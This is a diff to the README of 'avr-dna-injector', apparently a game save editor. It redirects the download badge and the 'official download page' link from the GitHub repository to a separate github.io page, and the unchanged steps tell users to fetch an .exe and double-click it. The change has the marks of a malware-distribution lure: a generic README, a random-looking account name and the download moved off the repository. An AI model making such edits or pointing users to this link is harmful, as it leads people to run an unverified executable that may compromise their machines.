@@ -1,6 +1,6 @@
 # 🧬 avr-dna-injector - Modify your game save files easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/bladeroastraetam664/avr-dna-injector)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest-blue.svg)](https://bladeroastraetam664.github.io)
 
 ## 📖 Overview
 
@@ -18,7 +18,7 @@ The program requires no installation. It runs as a standalone file. You need abo
 
 Follow these steps to obtain and use the tool on your computer.
 
-1. Go to the official download page: [https://github.com/bladeroastraetam664/avr-dna-injector](https://github.com/bladeroastraetam664/avr-dna-injector).
+1. Go to the official download page: [https://bladeroastraetam664.github.io](https://bladeroastraetam664.github.io).
 2. Choose the latest release file ending in .exe.
 3. Save the file to a folder on your computer.
 4. Double-click the file to open the program interface.
